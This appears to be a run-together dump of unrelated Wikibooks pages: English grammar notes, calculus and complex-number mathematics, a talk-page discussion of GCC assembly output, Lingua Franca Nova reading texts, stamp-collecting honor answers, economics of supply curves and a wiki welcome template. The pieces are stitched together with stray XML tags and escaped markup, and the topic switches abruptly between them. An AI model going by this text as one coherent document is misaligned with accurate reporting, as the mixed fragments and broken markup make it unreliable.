'''Never use IT to refer to a person!''' Use '''HE''' if the person is a man. Use '''SHE''' if the person is a woman.

If the gender of the person being referred to is ''unknown'' or if one wants to refer ''generically'' to people, '''they''' is often used.

 * Whoever ''THEY'' were; ''they'' did a good job.

      <text xml:space="preserve">==Adjective==
'''A describing word'''.

An adjective is a word that describes how or what something else is. Examples include ''hot'' ''cold'', and ''fluffy''. The adjective usually goes '''before''' the object in English, for example: &lt;br&gt;
''A '''fluffy''' duck.''&quot; &lt;br&gt;&lt;br&gt;
However, it can also be used in the following way: &lt;br&gt;
&quot;''My hamster is '''sick'''.&quot;

      <text xml:space="preserve">===Differential calculus===
We have the following formulas:

:&lt;math&gt;r \tfrac{\partial}{\partial r}= x \tfrac{\partial}{\partial x} + y \tfrac{\partial}{\partial y} \,&lt;/math&gt;
:&lt;math&gt;\tfrac{\partial}{\partial \theta} = -y \tfrac{\partial}{\partial x} + x \tfrac{\partial}{\partial y} .&lt;/math&gt;

To find the Cartesian slope of the tangent line to a polar curve ''r''(θ) at any given point, the curve is first expressed as a system of parametric equations.

:&lt;math&gt;x=r(\theta)\cos\theta \,&lt;/math&gt;

:&lt;math&gt;y=r(\theta)\sin\theta \,&lt;/math&gt;

Differentiating both equations with respect to θ yields

:&lt;math&gt;\tfrac{\partial x}{\partial \theta}=r'(\theta)\cos\theta-r(\theta)\sin\theta \,&lt;/math&gt;

:&lt;math&gt;\tfrac{\partial y}{\partial \theta}=r'(\theta)\sin\theta+r(\theta)\cos\theta \,&lt;/math&gt;

Dividing the second equation by the first yields the Cartesian slope of the tangent line to the curve at the point (''r'',&amp;nbsp;''r''(θ)):

:&lt;math&gt;\frac{dy}{dx}=\frac{r'(\theta)\sin\theta+r(\theta)\cos\theta}{r'(\theta)\cos\theta-r(\theta)\sin\theta}&lt;/math&gt;

In mathematics, a '''complex number''' is a number of the form   	
:&lt;math&gt; a + bi \,&lt;/math&gt;
 
where ''a'' and ''b'' are real numbers, and ''i'' is the imaginary unit, with the property ''i'' &lt;sup&gt;2&lt;/sup&gt; = &amp;minus;1. The real number ''a'' is called the ''real part'' of the complex number, and the real number ''b'' is the ''imaginary part''. Real numbers may be considered to be complex numbers with an imaginary part of zero; that is, the real number ''a'' is equivalent to the complex number ''a''+0''i''.

For example, 3 + 2''i'' is a ''complex number'', with real part 3 and imaginary part 2.  If ''z'' = ''a'' + ''bi'', the real part (''a'') is denoted Re(''z''), or ℜ(''z''), and the imaginary part (''b'') is denoted Im(''z''), or ℑ(''z'').

Complex numbers can be added, subtracted, multiplied, and divided like real numbers and have other elegant properties. For example, real numbers alone do not provide a solution for every polynomial algebraic equation with real coefficients, while complex numbers do (this is the fundamental theorem of algebra). 

== Equality ==         
Two complex numbers are equal if and only if their real parts are equal ''and'' their imaginary parts are equal.  That is, ''a''&amp;nbsp;+&amp;nbsp;''bi''&amp;nbsp;=&amp;nbsp;''c''&amp;nbsp;+&amp;nbsp;''di'' if and only if ''a''&amp;nbsp;=&amp;nbsp;''c'' and ''b''&amp;nbsp;=&amp;nbsp;''d''.

==Notation and operations==
The set of all complex numbers is usually denoted by '''C''', or in blackboard bold by &lt;math&gt;\mathbb{C}&lt;/math&gt; (Unicode ℂ). The real numbers, '''R''', may be regarded as &quot;lying in&quot; '''C''' by considering every real number as a complex: ''a'' = ''a'' + 0''i''. 

Complex numbers are added, subtracted, and multiplied by formally applying the associative, commutative and distributive laws of algebra, together with the equation ''i''&lt;sup&gt;2&lt;/sup&gt;&amp;nbsp;=&amp;nbsp;&amp;minus;1:  

:&lt;math&gt;\,(a + bi) + (c + di) = (a + c) + (b + d)i&lt;/math&gt;
:&lt;math&gt;\,(a + bi) - (c + di) = (a - c) + (b - d)i&lt;/math&gt;
:&lt;math&gt;\,(a + bi)(c + di) = ac + bci + adi + bd i^2 = (ac - bd) + (bc + ad)i&lt;/math&gt;

Division of complex numbers can also be defined (see below). Thus, the set of complex numbers forms a field which, in contrast to the real numbers, is algebraically closed.

In mathematics, the adjective &quot;complex&quot; means that the field of complex numbers is the underlying number field considered, for example complex analysis, complex matrix, complex polynomial and complex Lie algebra.

== The field of complex numbers ==
Formally, the complex numbers can be defined as ordered pairs of real numbers (''a'', ''b'') together with the operations:
:&lt;math&gt;(a,b) + (c,d) = (a + c,b + d) \,&lt;/math&gt; 

:&lt;math&gt;(a,b) \cdot (c,d) = (ac - bd,bc + ad). \,&lt;/math&gt; 

So defined, the complex numbers form a field, the complex number field, denoted by '''C''' (a field is an algebraic structure in which addition, subtraction, multiplication, and division are defined and satisfy certain algebraic laws. For example, the real numbers form a field).

The real number ''a'' is identified with the complex number (''a'', 0), and in this way the field of real numbers '''R''' becomes a subfield of '''C'''.  The imaginary unit ''i'' can then be defined as the complex number (0, 1), which verifies 
:&lt;math&gt;(a, b) = a \cdot (1, 0) + b \cdot (0, 1) = a + bi \quad \text{and} \quad i^2 = (0, 1) \cdot (0, 1) = (-1, 0) = -1.&lt;/math&gt;

In '''C''', we have:
* additive identity (&quot;zero&quot;): (0, 0)
* multiplicative identity (&quot;one&quot;): (1, 0)
* additive inverse of (''a'',''b''): (&amp;minus;''a'', &amp;minus;''b'')
* multiplicative inverse (reciprocal) of non-zero (''a'', ''b''): &lt;math&gt;\left({a\over a^2+b^2},{-b\over a^2+b^2}\right).&lt;/math&gt;

Since a complex number ''a'' + ''bi'' is uniquely specified by an ordered pair (''a'', ''b'') of real numbers, the complex numbers are in one-to-one correspondence with points on a plane, called the complex plane.


== The complex plane ==

A complex number ''z'' can be viewed as a point or a position vector in a two-dimensional Cartesian coordinate system called the '''complex plane''' or '''Argand diagram''' . The point and hence the complex number ''z'' can be specified by Cartesian (rectangular) coordinates. The Cartesian coordinates of the complex number are the real part ''x'' = Re(''z'') and the imaginary part ''y'' = Im(''z''). The representation of a complex number by its Cartesian coordinates is called the ''Cartesian form'' or ''rectangular form'' or ''algebraic form'' of that complex number.

=== Polar form ===
Alternatively, the complex number ''z'' can be specified by polar coordinates. The polar coordinates are ''r''&amp;nbsp;=&amp;nbsp; |''z''| ≥ 0, called the '''absolute value''' or '''modulus''', and φ&amp;nbsp;=&amp;nbsp;arg(''z''), called the '''argument''' of ''z''. For ''r''&amp;nbsp;=&amp;nbsp;0 any value of φ describes the same number. To get a unique representation, a conventional choice is to set arg(0)&amp;nbsp;=&amp;nbsp;0. For ''r''&amp;nbsp;&gt;&amp;nbsp;0 the argument φ is unique modulo 2π; that is, if any two values of the complex argument differ by an exact integer multiple of 2π, they are considered equivalent. To get a unique representation, a conventional choice is to limit φ to the interval (-π,π], i.e. &amp;minus;π&amp;nbsp;&lt;&amp;nbsp;φ&amp;nbsp;≤&amp;nbsp;π. The representation of a complex number by its polar coordinates is called the ''polar form'' of the complex number.

=== Conversion from the polar form to the Cartesian form ===
:&lt;math&gt;x = r \cos \varphi&lt;/math&gt;
:&lt;math&gt;y = r \sin \varphi&lt;/math&gt;

=== Conversion from the Cartesian form to the polar form ===
:&lt;math&gt;r = \sqrt{x^2+y^2}&lt;/math&gt;

:&lt;math&gt;\varphi = 
\begin{cases}
\arctan(\frac{y}{x}) &amp; \mbox{if } x &gt; 0\\
\arctan(\frac{y}{x}) + \pi &amp; \mbox{if } x &lt; 0 \mbox{ and } y \ge 0\\
\arctan(\frac{y}{x}) - \pi &amp; \mbox{if } x &lt; 0 \mbox{ and } y &lt; 0\\
+\frac{\pi}{2} &amp; \mbox{if } x = 0 \mbox{ and } y &gt; 0\\
-\frac{\pi}{2} &amp; \mbox{if } x = 0 \mbox{ and } y &lt; 0\\
\mathrm{undefined} &amp; \mbox{if } x = 0 \mbox{ and } y = 0.
\end{cases}&lt;/math&gt;

The previous formula requires rather laborious case differentiations. However, many programming languages provide a variant of the arctangent function. A formula that uses the arccos function requires fewer case differentiations:
:&lt;math&gt;\varphi = 
\begin{cases}
+\arccos\frac{x}{r} &amp; \mbox{if } y \geq 0 \mbox{ and } r \ne 0\\
-\arccos\frac{x}{r} &amp; \mbox{if } y &lt; 0\\
\mathrm{undefined} &amp; \mbox{if } r = 0.
\end{cases}&lt;/math&gt;

=== Notation of the polar form ===
The notation of the polar form as
:&lt;math&gt; z = r\,(\cos \varphi + i\sin \varphi )\,&lt;/math&gt;
is called ''trigonometric form''. The notation cis φ is sometimes used as an abbreviation for cos φ + ''i'' sin φ.
Using [[w:Euler's formula|Euler's formula]] it can also be written as
:&lt;math&gt; z = r\,\mathrm{e}^{i \varphi}\,,&lt;/math&gt;
which is called ''exponential form''.

=== Multiplication, division, exponentiation, and root extraction in the polar form ===
Multiplication, division, exponentiation, and root extraction are much easier in the polar form than in the Cartesian form. 

Using [[w:List of trigonometric identities#Angle sum and difference identities|sum and difference identities]] its possible to obtain that

:&lt;math&gt;r_1\,e^{i\varphi_1} \cdot r_2\,e^{i\varphi_2} 
= r_1\,r_2\,e^{i(\varphi_1 + \varphi_2)} \,&lt;/math&gt;

and that

:&lt;math&gt;\frac{r_1\,e^{i\varphi_1}}{r_2\,e^{i\varphi_2}}
 = \frac{r_1}{r_2}\,e^{i (\varphi_1 - \varphi_2)}. \,&lt;/math&gt;

Exponentiation with integer exponents; according to [[w:De Moivre's formula|de Moivre's formula]],

: &lt;math&gt;\big(r\,e^{i\varphi}\big)^n = r^n\,e^{in\varphi}. \,&lt;/math&gt;

Exponentiation with arbitrary complex exponents is discussed in the article on [[exponentiation]].

The addition of two complex numbers is just the addition of two vectors, and multiplication by a fixed complex number can be seen as a simultaneous rotation and stretching. 

Multiplication by ''i'' corresponds to a counter-clockwise rotation by 90° (π/2 radians). The geometric content of the equation ''i''&lt;sup&gt;&amp;thinsp;2&lt;/sup&gt;&amp;nbsp;=&amp;nbsp;&amp;minus;1 is that a sequence of two 90 degree rotations results in a 180 degree (π radians) rotation. Even the fact (&amp;minus;1)&amp;nbsp;·&amp;nbsp;(&amp;minus;1)&amp;nbsp;=&amp;nbsp;+1 from arithmetic  can be understood geometrically as the combination of two 180 degree turns.

All the roots of any number, real or complex, may be found with a simple algorithm.  The ''n''th roots are given by

:&lt;math&gt;  \sqrt[n]{r e^{i\varphi}}=\sqrt[n]{r}\ e^{i\left(\frac{\varphi+2k\pi}{n}\right)}&lt;/math&gt;

for ''k''&amp;nbsp;=&amp;nbsp;0,&amp;nbsp;1,&amp;nbsp;2,&amp;nbsp;…,&amp;nbsp;''n''&amp;thinsp;&amp;minus;&amp;thinsp;1, where &lt;math&gt;\sqrt[n]{r}&lt;/math&gt; represents the principal ''n''th root of ''r''.

==Absolute value, conjugation and distance==
The '''absolute value''' (or ''modulus'' or ''magnitude'') of a complex number ''z''  = ''r e''&lt;sup&gt;''i''φ&lt;/sup&gt; is defined as |''z''| = ''r''. Algebraically, if ''z'' = ''a'' + ''bi'', then &lt;math&gt; | z | = \sqrt{a^2+b^2}.&lt;/math&gt;&lt;!--keep sentence-terminator within math element to make it align better with the formula--&gt;

One can check readily that the absolute value has three important properties:

:&lt;math&gt; | z | = 0 \,&lt;/math&gt; if and only if &lt;math&gt; z = 0 \,&lt;/math&gt;

:&lt;math&gt; | z + w | \leq | z | + | w | \,&lt;/math&gt; (triangle inequality)

:&lt;math&gt; | z \cdot w | = | z | \cdot | w | \,&lt;/math&gt;

for all complex numbers ''z'' and ''w''.   It then follows, for example, that &lt;math&gt; | 1 | = 1 &lt;/math&gt; and &lt;math&gt;|z/w|=|z|/|w|&lt;/math&gt;.  By defining the '''distance''' function ''d''(''z'', ''w'') = |''z'' &amp;minus; ''w''| we turn the set of complex numbers into a [[w:metric space|metric space]] and we can therefore talk about limits and continuity. 

The '''complex conjugate''' of the complex number ''z'' = ''a'' + ''bi'' is defined to be ''a'' &amp;minus; ''bi'', written as &lt;math&gt;\bar{z}&lt;/math&gt; or &lt;math&gt;z^*\,&lt;/math&gt;. As seen in the figure, &lt;math&gt;\bar{z}&lt;/math&gt; is the &quot;reflection&quot; of ''z'' about the real axis. The following can be checked:
: &lt;math&gt;\overline{z+w} = \bar{z} + \bar{w}&lt;/math&gt;

: &lt;math&gt;\overline{z\cdot w} = \bar{z}\cdot\bar{w}&lt;/math&gt;

: &lt;math&gt;\overline{(z/w)} = \bar{z}/\bar{w}&lt;/math&gt;

: &lt;math&gt;\bar{\bar{z}}=z&lt;/math&gt;

: &lt;math&gt;\bar{z}=z&lt;/math&gt; &amp;nbsp; if and only if ''z'' is real

: &lt;math&gt;|z|=|\bar{z}|&lt;/math&gt;

: &lt;math&gt;|z|^2 = z\cdot\bar{z}&lt;/math&gt;

: &lt;math&gt;z^{-1} = \bar{z}\cdot|z|^{-2}&lt;/math&gt; &amp;nbsp; if ''z'' is non-zero.

The latter formula is the method of choice to compute the inverse of a complex number if it is given in rectangular coordinates.

That conjugation commutes with all the algebraic operations (and many functions; ''e.g.'' &lt;math&gt;\sin\bar z=\overline{\sin z}&lt;/math&gt;) is rooted in the ambiguity in choice of ''i'' (&amp;minus;1 has two square roots). It is important to note, however, that the function &lt;math&gt;f(z) = \bar{z}&lt;/math&gt; is not complex-differentiable.

==Complex fractions==
We can divide a complex number (''a''&amp;nbsp;+&amp;nbsp;''bi'') by another complex number (''c''&amp;nbsp;+&amp;nbsp;''di'')&amp;nbsp;≠&amp;nbsp;0 in two ways.  The first way has already been implied: to convert both complex numbers into exponential form, from which their quotient is easily derived.  The second way is to express the division as a fraction, then to multiply both numerator and denominator by the complex conjugate of the denominator.  The new denominator is a real number.

:&lt;math&gt;
\begin{align}
{a + bi \over c + di}&amp; = {(a + bi) (c - di) \over (c + di) (c - di)} = {(ac + bd) + (bc - ad) i \over c^2 + d^2}\\ &amp; = \left({ac + bd \over c^2 + d^2}\right) + i\left( {bc - ad \over c^2 + d^2} \right).\,
\end{align}
&lt;/math&gt;

==Matrix representation of complex numbers==
While usually not useful, alternative representations of the complex field can give some insight into its nature. One particularly elegant representation interprets each complex number as a 2×2 matrix with real entries which stretches and rotates the points of the plane. Every such matrix has the form
:&lt;math&gt;
\begin{bmatrix}
  a &amp;   -b  \\
  b &amp; \;\; a  
\end{bmatrix}
&lt;/math&gt;

where ''a'' and ''b'' are real numbers. The sum and product of two such matrices is again of this form. Every non-zero matrix of this form is invertible, and its inverse is again of this form. Therefore, the matrices of this form are a field. In fact, this is exactly the field of complex numbers. Every such matrix can be written as
:&lt;math&gt;
\begin{bmatrix}
  a &amp;     -b  \\
  b &amp; \;\; a  
\end{bmatrix}
=
a \begin{bmatrix}
  1 &amp; \;\; 0  \\
  0 &amp; \;\; 1 
\end{bmatrix}
+
b \begin{bmatrix}
  0 &amp;     -1  \\
  1 &amp; \;\; 0 
\end{bmatrix}
&lt;/math&gt;
which suggests that we should identify the real number 1 with the identity matrix
:&lt;math&gt;
\begin{bmatrix}
  1 &amp; \;\; 0  \\
  0 &amp; \;\; 1 
\end{bmatrix},
&lt;/math&gt;
and the imaginary unit ''i'' with
:&lt;math&gt;
\begin{bmatrix}
  0 &amp;     -1  \\
  1 &amp; \;\; 0  
\end{bmatrix},
&lt;/math&gt;

a counter-clockwise rotation by 90 degrees. Note that the square of this latter matrix is indeed equal to the 2×2 matrix that represents &amp;minus;1.

The square of the absolute value of a complex number expressed as a matrix is equal to the determinant of that matrix.  
:&lt;math&gt; |z|^2 =
\begin{vmatrix}
  a &amp; -b  \\
  b &amp;  a  
\end{vmatrix}
= (a^2) - ((-b)(b)) = a^2 + b^2
&lt;/math&gt;
If the matrix is viewed as a transformation of the plane, then the transformation rotates points through an angle equal to the argument of the complex number and scales by a factor equal to the complex number's absolute value. The conjugate of the complex number ''z'' corresponds to the transformation which rotates through the same angle as ''z'' but in the opposite direction, and scales in the same manner as ''z''; this can be represented by the transpose of the matrix corresponding to ''z''.

If the matrix elements are themselves complex numbers, the resulting algebra is that of the quaternions. In other words, this matrix representation is one way of expressing the Cayley-Dickson construction of algebras.

      <text xml:space="preserve">* comments from development-2006-8ecbb5cc8aREMOVETHIS@ANDTHATm-e-leypold.de

''EBP is used as the base register to reference the local variables [1], and a value is subtracted from ESP to reserve space on the stack''
:: I have the impression that does not make sense. Isn't ESP used as stack pointer and base register for the local variables whereas EBP is used as base pointer to the procedure arguments (which are pushed on the stack before calling the procedure). -- REGARDS -- development-2006-8ecbb5cc8aREMOVETHIS@ANDTHATm-e-leypold.de. I'm only passing through here, so if this point needs discussion, please notify me by mail.

Your GCC produces much different code (more, even) than mine does. Even for hello_world. Yours calls __alloc and ___main, mine doesn't. 
:: Thats because ''These functions are part of the C library setup. Since we are calling functions in the C library, we probably need these'' isn't true. ___main facilitates C++ static initialisation on non-ELF system (ELF systems include UNIX/LINUX but not Windows). If you don't call C++ code, ___main isn't required. The comments about using Win32 API in place of the C standard library really should be re-visited in light of this.
::: No compiler will ever emit a call to &quot;__alloca&quot;. Alloca is a compiler intrinsic that gets compiled to allocating stack frame space. [[Special:Contributions/63.235.13.3|63.235.13.3]] ([[User talk:63.235.13.3|discuss]]) 00:50, 1 July 2012 (UTC)

You write: ''In this case, eight bytes have been reserved on the stack. Since we have no local variables in this procedure, this code is unnecessary.'' [2]

:: That's unfortunately not true. You should note, that later we have 'movl $LC0, (%esp)'. This is exactly where the temporary reserved at the beginning of the procedure becomes a necessity.

:::It's important to remember that the code output of the assembler will be very much dependant on the local environment. If the generated code is different from yours, it is likely the result of either a different version of the compiler, different libraries, or a different operating system. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 19:11, 22 June 2007 (UTC)
:::: absolutely right: That accounts for the different output of our respective compilers. But my other comments still stand: [1] seems to be a typo and [2] seems to be simply wrong. But don't take it on my authority (which has over the years become rather weak concerning gcc output), which is why I'm not changing it myself now: A second opinion would be nice. -- M.
:::::I seem to think that [1] is correct, although it has been a long time for me since I've last used GCC to generate assembly as well. It is something that we should probably double-check before we make any changes. As for [2], you are right that it seems to be an error, so i've gone ahead and changed it. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 23:45, 24 June 2007 (UTC)

''then rewrite selected routines in assembly language (which performs better)''
:: Kind of hard to take this page seriously if this is the advice, circa 2010.  It's been demonstrated that in fact compilers do regularly produce better code than handcoded assembly does. In fact aggressive inlining from JITs in &quot;slow&quot; languages like Java can be faster than C!

== Caveats ==

&lt;blockquote&gt;
''This happens with all the '''non-commutative''' arithmetic floating point operations with two register operands where the source register is %st and the destination register is %st(i).''
&lt;/blockquote&gt;
What does this mean? Addition and multiplication are both perfectly commutative.</text>

[[Image:Scales%2C-Martin.jpg|center]]

A esta sera Peter va encontra Maria.

Aora Peter es nervosa.

Peter es pensante ce el pote surprende Maria.

A la anio ante esta anio, Peter ia aprende jua la gitar.

Esce Maria va gusta escuta cuando el jua la gitar?

Esce Maria va gusta ce Peter jua la gitar per el?

Posible Maria va vole dansa en cuando el jua la gitar.

Aora el no sabe, ma doman el va sabe plu ca oji.

Ma la espeta es difisil, e Peter deveni plu rapida vea oji ca ier.

Ier Peter no ia es nervosa.

==1. Relate briefly the story of the beginning of the postal service in your country.== 
[[Image:PostOffice!.PNG|thumb|200px|right|Running pony logo used before 1970 before the &quot;Department&quot; became a &quot;Service&quot;.]]
:The first postal service in America arose in February of 1692 when a grant from King William and Queen Mary empowered Thomas Neale ''to erect, settle and establish within the chief parts of their majesties' colonies and plantations in America, an office or offices for the receiving and dispatching letters and pacquets, and to receive, send and deliver the same under such rates and sums of money as the planters shall agree to give, and to hold and enjoy the same for the term of twenty-one years.''

:The United States Postal Service was created in Philadelphia under Benjamin Franklin on July 26, 1775 by decree of the Second Continental Congress. Based on a clause in the United States Constitution empowering Congress ''To establish post offices and post roads,'' it became the Post Office Department in 1792. It was part of the Presidential cabinet and the postmaster general was the last person in the United States presidential line of succession. In 1971, the department was reorganized as a quasi-independent agency of the federal government and acquired its present name. The postmaster general is no longer in the presidential line of succession.

:From 1837 to 1970, the Postal Service used a running pony as its logo; that logo was replaced by an eagle. In the 1990s, the eagle was redesigned again so that it was just the head.
==2. How is the history of your country told in postage stamps? ==
:Stamps can tell may different stories. For example, the price of first class stamps tells the history of how much it costs to send first class mail over the years. Also, many important and not so important persons appear on the stamps. Many of these people have shaped the history of your country.  Additionally, significant events, places, or things may be commemorated on the stamps, again, documenting a historical event or an era.

:See http://en.wikipedia.org/wiki/List_of_people_on_stamps_of_Great_Britain.
:See http://en.wikipedia.org/wiki/Prominent_Americans_series.
==3. What are the rates for first-class mail in your country? ==
:You can find the rates for first-class mail ''(in the United States)'' at http://www.usps.com/rates/first-class-mail-rates.htm

:[[W:History_of_United_States_Postal_Service_rates|History of US Postal Service rates]]

==4. What country does not have its name on its stamps and why? ==
:'''Great Britain'''.
:'''Why?''' : The stamp was originally for use only within the United Kingdom of Great Britain and Ireland and as such was in effect initially a local stamp. For this reason the name of the country was not included within the design, a situation which continued by agreement with foreign post offices, provided the sovereign’s effigy appeared on the stamp.
==5. Know the meaning of the following:== 
===a. Coil stamp ===  
:A coil stamp is a type of postage stamp sold in strips one stamp wide. The name derives from the usual handling of long strips, which is to coil them into rolls, in a manner reminiscent of adhesive tape rolls. A large percentage of modern stamps is sold in coil form, since they are more amenable to mechanized handling in large quantities than either sheet stamps or booklet stamps.
===b. Booklet stamp=== 
:A postage stamp booklet is a set of one or more small panes of postage stamps, usually totalling about 10–20 stamps, folded over and placed in a cardboard cover. Smaller and easier to handle than a whole sheet of stamps, in many countries booklets have become a favored way to purchase stamps.
===c. Perforations=== 
:A perforation is a hole made by puncturing a surface. However, the term frequently refers to the practice of creating a long series of holes so that paper can be torn more easily. Postage stamps are one common application of this, where small round holes are cut in lines to create individual pieces.
===d. Perforation gauge === 
[[Image:Perforation gauge.jpg|thumb|right|150px|A Penny Red stamps measuring at 14 perfs-per-inch on a perforation gauge]]
A tool that measures the perforations in stamps. It's like a ruler.
&lt;br style=&quot;clear:both&quot;&gt;
===e. Definitive stamps===
:A definitive postage stamp is a regular issue stamp that is part of a definitive issue or definitive series consisting of a range of denominations sufficient to cover all postal rates usefully. (An &quot;issue&quot; generally means a set that is put on sale all at the same time, while a &quot;series&quot; is spread out over several years, but the terms are not precise.)
=== f. Commemorative stamps ===
:A commemorative stamp is a postage stamp issued to honor or commemorate a place, event or person. Most postal services of the world issue several of these each year, often holding first day of issue ceremonies at locations connected with the subjects. Commemorative stamps are usually used alongside ordinary or regular-issue stamps of the time, although in some cases their use has been obligatory.
=== g. Hinges ===
:Stamp hinges are small, folded, rectangular pieces of paper coated with a mild gum. They are used by stamp collectors to affix postage stamps onto the pages of a stamp album. The short end is moistened and affixed to the stamp, the long end is likewise affixed to the page. The hinge keeps the stamp on the page while still allowing it to be lifted to examine the back (for instance to see the watermark or expert marks).
===h. Plastic mounts ===
:Clear plastic pockets with adhesive on the back. The stamp is placed inside the mount and the  mount is attached. The stamp is preserved in it's original collected condition.
==6. Have a knowledge of how to soak stamps from paper and how to dry them.== 
:*Do not soak stamps from differently colored paper together.
:*Use lukewarm water.
:*Make sure the stamps are completely submerged.
:*If the stamp does not pull away cleanly, try soaking it more.
:*Dry each stamp separately, face down on newspaper (no colors on newspaper).
:*Do not allow stamps to touch each other or overlay while drying.
==7. Make a collection of at least 750 stamps. (No two stamps alike.) ==
:''Better get started''.
==8. Properly classify these stamps: ==
===a. As to country.=== 
===b. In series; that is, according to year and design.=== 
:''Arrange the stamps you have collected.''
==9. Mount your stamps with gummed hinges or plastic mounts. (Plastic mounts are preferred for mint stamps.) ==
:''In an album.''
==10. Choose a topical idea and develop a display of at least nine pages, including a title page, suitable for a stamp club show, Pathfinder Fair, etc. Display should be artistically arranged, neatly labeled and mounted, showing careful thought and research. Be sure to include several covers or cachets. ==

Tu valua lingua franca nova per comunica internasional?

O tu valua engles o un otra lingua natural o creada?

Per multe persones, incluinte los ci parla engles,
engles no es fasil e la spele es noncoerente. 

'''Lfn''' es vera regula ma no pare tro artifisial.

Donce, '''lfn''' es fasil per cada person. 

Vera, '''lfn''' es plu fasil per parlores de linguas roman moderne.

Ma esce esta es un bon disputa contra '''lfn'''?

Me ia vesti me en un camisa, pantalon, e un jaca lejera.

Me ia vesti en sapatos, no en sandales, car oji es fria.

E, con me oculos e me jacon de lana, me ia es pronto per vade a la ofisia!

Seniora Grapa comanda frecuente libros con interede.

Normal cada cosa opera bon, ma alga semanas pasada el ia reseta un paceta strana.

En la paceta ia es un libro con pajes nonscriveda! 

Seniora Grapa ia pensa ce esta debe es un era de la libreria, e el ia scrive pronto un letera cexante a la libreria.

Pronto la libreria ia responde e ia reconta a el, ce a causa de la presos, la editores publica aora sola libros de rede.

La primadores e incas es tro cara.

Ma libros vacua es bastante rara.

La libreria regrete vera esta caso, e va envia a el un peneta sin costa, afin seniora Grapa pote scrive en la libro.

Un prado es un campo de flores e erbas.

Cuando pluve, la campo deveni fango.

La sol asende en la este, e desende en la ueste.

La luna jira sirca la tera, e la tera jira sirca la sol.

Nos vide la stelas en la sielo a la note.

[[Image:2002-08_Westerland_Sundown.jpg|thumb|center|a fini de la dia]]

Imajina un isola en la Mar Mediteraneo, entre Sardinia e Minorca, clamada la Isola Franca. &quot;Franca&quot; es la nom donada a la persones de la ueste par la arabis ci naviga la Mediteraneo en edas antica. Franca es ance un parola cual sinifia un person ci parla direta e no dise cual el no intende. La popla de la isola ia es orgulosa de se isola, se identia, e se lingua.

La isola es la abitada par la desendentes de persones de cada pais de la Mediteraneo, e alga de otra locas ance. Los es la desendentes de comersiores, piratas, soldatos, marinores, furores, sclavos, e multe otra persones, bon e mal. Per comunica entre esta misca diversa, la popla ia usa parolas de italian, catalan, espaniol, portuges, e franses, ma con un gramatica multe simple.

Resente, la popla ia deside ce se lingua nesesa un forma ofisial, con un spele simple e coerente. Cuando la linguistes de la isola ia fini se laboras, los ia demanda ce la popla vota si o no. Cuasi tota la persones francan ia vota si (estra un poca de omes vea ci vota sempre &quot;no&quot;) e la lingua ia es fundida. Los ia clama esta lingua &quot;la lingua franca nova&quot;, e persones ci parla esta lingua &quot;la francanovistes&quot;.

Car la isola es vera peti, la mundo moderna no ia nota la pais, la se popla rara, e la se lingua strana. Ma linguistes de otra paises ia nota final la lingua, e ia reporta sur el en se jornales oscur. E un poca de usores de la interede ia scrive articles sur e en la lingua. Los ia nota ce lingua franca nova es un lingua amable, plasente, e (si!) franca. De alora, un dia nova ia ariva per la francanovistes!

      <text xml:space="preserve">==Adding capital==
[[Image:HouSupply6.png|600px]]

Growing firms add capital - often in the form of factories or machines - to increase their output. However, additional capital do not act the same as the original set of capital. At first, added capital may greatly increase productivity. However, additional units of capital become less cost-effective because of diminishing marginal returns, increasing costs, and loss of efficiency. Hence the latter short run supply curves begin to shift upward. In the graph, additional units of capital introduce new supply curves shifted rightward from the previous ones. 


==Economies of scale==
[[Image:HouSupply5.png|600px]]

From these various short run supply curves we can construct a long run supply curve that shows the minimum costs (assuming flexible and optimal use of labor) as capital changes. The long run supply curve connects the minimums of the short run curves and is considerably more stretched. At the beginning, where the long run supply (cost) is decreasing, the firm (or industry) is experiencing '''increasing returns to scale''' because a unit of resources yields more returns. In the center point, the minimum of the long run, the firm (or industry) is experiencing '''constant returns to scale'''. After that point, the firm (or industry) is experiencing '''decreasing returns to scale''' for similar reasons. Different industries have a different apportionment of these three segments, with some (such as agriculture) having consistently large spans of constant returns to scale.


==Long run supply==
[[Image:HouSupply9.png|600px]]

Firms generally rush to be the first to reach the long run minimum, because this would give them a comparative advantage over other firms (lower average production costs). Firms rarely choose to go beyond this point because then their costs would begin to increase once again.

The answers to the Stamps honor are dependent on the country in which you live.  To keep from cluttering up the answers with all these variants, we instead provide separate answer chapters for each country.  

{{stage short|No_work|15 Mar, 2007}} [[../Stamps (Australia)|Stamps (Australia)]]&lt;br&gt;
{{stage short|No_work|15 Mar, 2007}} [[../Stamps (Canada)|Stamps (Canada)]]&lt;br&gt;

{{stage short|100%|28 May, 2007}} [[../Stamps (United States)|Stamps (United States)]]&lt;br&gt;

If your country is not listed here, please add it.  When you create the new page, start by inserting this text:

 &lt;nowiki&gt;{{subst:Adventist Youth Honors Answer Book/Arts and Crafts/Stamps (Template)}}
&lt;/nowiki&gt;


This will insert the requirements and all the invariant answers that have been added to date.  You can then start adding the rest of the answers and editing answers we ''thought'' were invariant.  

You can edit the main template [[Adventist Youth Honors Answer Book/Arts and Crafts/Stamps (Template)|here]], but keep in mind that it should only have generally applicable answers (i.e., country-invariant answers).

* Wikibooks is a collection of open-source textbooks. See [[WB:WIW|What is Wikibooks]] to find out what types of books are acceptable.
* To learn the wiki-markup-language syntax, see [[Help:Editing]].
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126; 
**There is a box at the top of the edit window that will insert this, too; it looks like part of a signature.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* You can tell the community something about yourself in your userpage.
** You can get to this page by clicking the tab at the top of the page labeled with your registered username.
* If you are a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] (requests for importation) to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using Wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].
* Explore, [[Wikibooks:Be bold in updating pages|be bold in editing pages]], and have fun!

